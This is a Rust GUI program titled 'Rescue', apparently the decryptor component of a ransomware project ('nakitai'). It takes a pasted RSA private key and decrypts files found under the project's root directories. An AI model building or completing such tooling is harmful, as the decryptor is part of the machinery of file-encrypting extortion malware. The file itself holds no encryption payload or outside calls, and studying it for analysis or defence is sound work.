extern crate core;

use druid::{
    piet::InterpolationMode,
    widget::{Button, FillStrat, Flex, Image, Label, SizedBox, TextBox},
    AppLauncher, Data, ImageBuf, Lens, Widget, WidgetExt, WindowDesc,
};
use nakitai::{count_encrypted_files, find_encrypted_files, utils::crypto, ROOT_DIRS};
use openssl::rsa::Rsa;
use std::sync::{mpsc::channel, Arc};
use threadpool::ThreadPool;

#[derive(Clone, Data, Lens)]
struct AppState {
    is_decrypting: Arc<bool>,
    private_key_encoded_str: Arc<String>,
}

fn valid_rsa_private_key_format(private_key: &String) -> bool {
    private_key.len() > 0
        && private_key.starts_with("-----BEGIN RSA PRIVATE KEY-----")
        && private_key.ends_with("-----END RSA PRIVATE KEY-----")
}

fn run_decryption(private_key_str: &String) -> Result<(), anyhow::Error> {
    let private_key_b = private_key_str.as_bytes();
    let private_key = Rsa::private_key_from_pem(&private_key_b[..])?;

    #[cfg(debug_assertions)]
    {
        println!(
            "private_key [({:?})] => {:?}",
            private_key_b.len(),
            private_key_b
        );
    }

    let files_count = ROOT_DIRS
        .into_iter()
        .map(|i| count_encrypted_files(i))
        .reduce(|acum, item| acum + item)
        .unwrap();

    #[cfg(debug_assertions)]
    {
        println!("Decrypt files count => {:?}", files_count);
    }

    let pool = ThreadPool::new(1);
    let (tx, rx) = channel();

    for dir in ROOT_DIRS {
        find_encrypted_files(dir, |entry, _| {
            let tx = tx.clone();
            let private_key = private_key.clone();
            pool.execute(move || {
                let file_path = entry.path().display().to_string();
                match crypto::decrypt_file(&file_path, 256, &private_key) {
                    Ok(_) => {}
                    Err(err) => {
                        #[cfg(debug_assertions)]
                        {
                            println!("Failed file encryption => {:?}\n{:?}", file_path, err);
                        }
                    }
                }
                match tx.send(1) {
                    Ok(_) => {}
                    _ => {
                        #[cfg(debug_assertions)]
                        {
                            println!("Failed to send decrypted notification => {:?}", file_path);
                        }
                    }
                }
            });
        });
    }

    let finished_jobs = rx.iter().take(files_count).count();

    #[cfg(debug_assertions)]
    {
        println!("Decrypted files count {:?}", finished_jobs);
    }

    Ok(())
}

fn build_dialog(success: bool) -> impl Widget<AppState> {
    let success_png_data_raw = include_bytes!("../assets/success.png");
    let error_png_data_raw = include_bytes!("../assets/error.png");
    let success_png_data = ImageBuf::from_data(success_png_data_raw).unwrap();
    let error_png_data = ImageBuf::from_data(error_png_data_raw).unwrap();
    let mut success_img = Image::new(success_png_data).fill_mode(FillStrat::Cover);
    let mut error_img = Image::new(error_png_data).fill_mode(FillStrat::Cover);
    success_img.set_interpolation_mode(InterpolationMode::Bilinear);
    error_img.set_interpolation_mode(InterpolationMode::Bilinear);

    Flex::column()
        .cross_axis_alignment(druid::widget::CrossAxisAlignment::Center)
        .with_child(match success {
            true => success_img,
            false => error_img,
        })
        .with_spacer(8.0)
        .with_child(Label::new(match success {
            true => "Successfully decrypted all files",
            false => "There was an unexpected error",
        }))

    /*.title(match success {
        true => "Success  (っ▀¯▀)つ",
        false => "Error  (⩾﹏⩽)",
    })
    .resizable(false)
    .window_size((300., 150.))*/
}

fn build_root_ui() -> impl Widget<AppState> {
    let png_data_raw = include_bytes!("../assets/top.png");
    let png_data = ImageBuf::from_data(png_data_raw).unwrap();
    let mut img = Image::new(png_data).fill_mode(FillStrat::Cover);
    img.set_interpolation_mode(InterpolationMode::Bilinear);

    let mut sized_img = SizedBox::new(img);
    sized_img = sized_img.fix_width(500 as f64);
    sized_img = sized_img.fix_height(200 as f64);

    let image_wrap = Flex::row()
        .cross_axis_alignment(druid::widget::CrossAxisAlignment::Start)
        .with_flex_child(sized_img, 1.0);

    let label_wrap = Flex::row()
        .cross_axis_alignment(druid::widget::CrossAxisAlignment::Start)
        .with_child(
            Label::new("Paste your private key")
                .with_line_break_mode(druid::widget::LineBreaking::WordWrap),
        );

    let button = SizedBox::new(
        Button::new("Recover")
            .on_click(|ctx, data: &mut AppState, _env| {
                if !valid_rsa_private_key_format(&*data.private_key_encoded_str) {
                    return;
                }

                data.is_decrypting = true.into();

                #[cfg(debug_assertions)]
                {
                    println!(
                        "private_key_encoded_str => {:?}",
                        data.private_key_encoded_str
                    );
                }

                data.is_decrypting = false.into();

                let decrypt_result = run_decryption(&*data.private_key_encoded_str);

                ctx.new_window(
                    WindowDesc::new(match decrypt_result {
                        Ok(_) => build_dialog(true),
                        Err(_) => build_dialog(false),
                    })
                    .title(match decrypt_result {
                        Ok(_) => "Success  (っ▀¯▀)つ",
                        Err(_) => "Error  (⩾﹏⩽)",
                    })
                    .resizable(false)
                    .window_size((300., 150.)),
                );
            })
            .disabled_if(|data: &AppState, _env| *data.is_decrypting),
    )
    .fix_height(48.0);

    let textbox_wrap = Flex::row()
        .cross_axis_alignment(druid::widget::CrossAxisAlignment::Start)
        .with_flex_child(
            SizedBox::new(
                TextBox::multiline()
                    .with_placeholder("Paste here")
                    .lens(AppState::private_key_encoded_str)
                    .disabled_if(|data: &AppState, _env| *data.is_decrypting)
                    .expand_width(),
            )
            .fix_height(216.)
            .expand_width(),
            1.0,
        )
        .with_child(SizedBox::empty().fix_width(8.))
        .with_child(button);

    Flex::column()
        .cross_axis_alignment(druid::widget::CrossAxisAlignment::Start)
        .with_child(image_wrap)
        .with_flex_child(
            Flex::column()
                .cross_axis_alignment(druid::widget::CrossAxisAlignment::Start)
                .with_child(label_wrap)
                .with_spacer(8.0)
                .with_child(textbox_wrap)
                //.with_child(textbox_wrap)
                .padding(8.0),
            1.0,
        )
}

fn main() -> Result<(), anyhow::Error> {
    let main_window = WindowDesc::new(build_root_ui())
        .title("Rescue  ( •̀ᴗ•́)و ̑̑")
        .resizable(false)
        .window_size((500., 500.));

    // create the initial app state
    let state = AppState {
        is_decrypting: false.into(),
        private_key_encoded_str: "".to_string().into(),
    };

    AppLauncher::with_window(main_window)
        .log_to_console()
        .launch(state)
        .expect("Failed to launch application");

    Ok(())
}
